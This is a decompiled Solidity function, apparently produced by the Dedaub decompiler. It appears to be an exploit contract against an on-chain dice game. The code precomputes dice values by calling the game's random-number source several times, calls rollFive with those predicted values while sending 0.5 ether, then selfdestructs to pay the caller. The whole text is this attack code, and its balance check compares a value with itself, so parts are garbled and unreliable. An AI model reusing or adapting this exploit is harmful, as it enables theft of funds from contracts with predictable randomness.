// Decompiled by library.dedaub.com
// 2023.03.07 10:50 UTC




// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__() public payable { 
    MEM[(MEM[64]) len 64] = 0x1e472571e72aa760a3f47a2c21a6cd844826edb60000000000000000000000000000000000000000000000000000000000000000;
    v0 = v1 = 0;
    while (v0 < MEM[32 + MEM[64]]) {
        require((address(MEM[MEM[64]])).code.size);
        v2, v3 = address(MEM[MEM[64]]).getRandomNumber(1, 7).gas(msg.gas);
        require(v2); // checks call status, propagates error data on error
        require(RETURNDATASIZE() >= 32);
        v0 += 1;
    }
    require((address(MEM[MEM[64]])).code.size);
    v4, v5 = address(MEM[MEM[64]]).getRandomNumber(1, 7).gas(msg.gas);
    require(v4); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require((address(MEM[MEM[64]])).code.size);
    v6, v7 = address(MEM[MEM[64]]).getRandomNumber(1, 7).gas(msg.gas);
    require(v6); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require((address(MEM[MEM[64]])).code.size);
    v8, v9 = address(MEM[MEM[64]]).getRandomNumber(1, 7).gas(msg.gas);
    require(v8); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require((address(MEM[MEM[64]])).code.size);
    v10, v11 = address(MEM[MEM[64]]).getRandomNumber(1, 7).gas(msg.gas);
    require(v10); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require((address(MEM[MEM[64]])).code.size);
    v12, v13 = address(MEM[MEM[64]]).getRandomNumber(1, 7).gas(msg.gas);
    require(v12); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require(0x997351b8cad2e1b531d6480ec0242fdc51a8ae09.code.size);
    v14 = 0x997351b8cad2e1b531d6480ec0242fdc51a8ae09.rollFive(0, 0xff & (0xff & v5), 0xff & (0xff & v7), 0xff & (0xff & v9), 0xff & (0xff & v11), 0xff & (0xff & v13)).value(0x6f05b59d3b20000).gas(msg.gas);
    require(v14); // checks call status, propagates error data on error
    require((address(this)).balance > (address(this)).balance);
    selfdestruct(msg.sender);
}
